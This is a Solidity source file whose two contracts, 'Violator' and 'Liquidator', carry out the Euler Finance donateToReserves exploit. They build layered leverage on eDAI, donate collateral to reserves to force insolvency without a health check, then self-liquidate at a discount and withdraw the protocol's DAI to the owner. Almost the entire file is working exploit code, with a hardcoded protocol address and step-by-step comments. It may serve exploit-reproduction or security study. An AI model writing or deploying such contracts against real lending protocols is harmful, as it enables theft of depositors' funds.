//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface EToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface DToken {
    function repay(uint256 subAccountId, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IEuler {
    struct LiquidationOpportunity {
        uint256 repay;
        uint256 yield;
        uint256 healthScore;
        uint256 baseDiscount;
        uint256 discount;
        uint256 conversionRate;
    }

    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield)
        external;
    function checkLiquidation(address liquidator, address violator, address underlying, address collateral)
        external
        returns (LiquidationOpportunity memory liqOpp);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf)
        external
        returns (uint256);

    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

/// @title Violator
/// @notice Exploits Euler Finance vulnerability by becoming insolvent through donateToReserves
/// @dev Uses layered leverage and donates collateral to reserves without health check, making account liquidatable
contract Violator {
    address public immutable OWNER;
    EToken public immutable E_DAI;
    DToken public immutable D_DAI;
    IEuler public immutable Euler;
    IERC20 public immutable DAI;
    address public immutable EULER_ADDRESS;

    constructor(address _eDai, address _dDai, address _euler, address _dai) {
        OWNER = msg.sender;
        E_DAI = EToken(_eDai);
        D_DAI = DToken(_dDai);
        Euler = IEuler(_euler);
        DAI = IERC20(_dai);
        EULER_ADDRESS = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    }

    /// @notice Executes the exploit by depositing, borrowing, and donating to become insolvent
    function violate() external {
        require(msg.sender == OWNER, "Not owner");
        // Step 1: Approve Euler to spend DAI
        DAI.approve(EULER_ADDRESS, type(uint256).max);
        // Step 2: Deposit 20M DAI as collateral
        E_DAI.deposit(0, 20_000_000 * 1e18);
        // Step 3: Mint 200M eDAI (first borrow, 10x leverage)
        E_DAI.mint(0, 200_000_000 * 1e18);
        // Step 4: Repay 10M DAI to improve health score
        D_DAI.repay(0, 10_000_000 * 1e18);
        // Step 5: Mint 200M eDAI again (second borrow, layered leverage)
        E_DAI.mint(0, 200_000_000 * 1e18);
        // Step 6: Donate 100M eDAI to reserves (vulnerability: no health check)
        E_DAI.donateToReserves(0, 100_000_000 * 1e18);
    }
}

/// @title Liquidator
/// @notice Liquidates the Violator account and extracts profit from Euler protocol
/// @dev After Violator becomes insolvent, liquidates at discount and withdraws remaining funds
contract Liquidator {
    address public immutable OWNER;
    EToken public immutable E_DAI;
    DToken public immutable D_DAI;
    IEuler public immutable Euler;
    IERC20 public immutable DAI;
    address public immutable EULER_ADDRESS;

    constructor(address _eDai, address _dDai, address _euler, address _dai) {
        OWNER = msg.sender;
        E_DAI = EToken(_eDai);
        D_DAI = DToken(_dDai);
        Euler = IEuler(_euler);
        DAI = IERC20(_dai);
        EULER_ADDRESS = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    }

    /// @notice Liquidates the violator account and extracts profit from Euler protocol
    function liquidate(address _violator) external {
        require(msg.sender == OWNER, "Not owner");
        // Step 1: Check liquidation opportunity
        IEuler.LiquidationOpportunity memory liqOppData =
            Euler.checkLiquidation(address(this), _violator, address(DAI), address(DAI));
        // Step 2: Execute liquidation
        Euler.liquidate(_violator, address(DAI), address(DAI), liqOppData.repay, liqOppData.yield);
        // Step 3: Withdraw remaining funds from Euler
        uint256 eulerBalance = DAI.balanceOf(EULER_ADDRESS);
        E_DAI.withdraw(0, eulerBalance);
        // Step 4: Transfer profit back to caller
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}
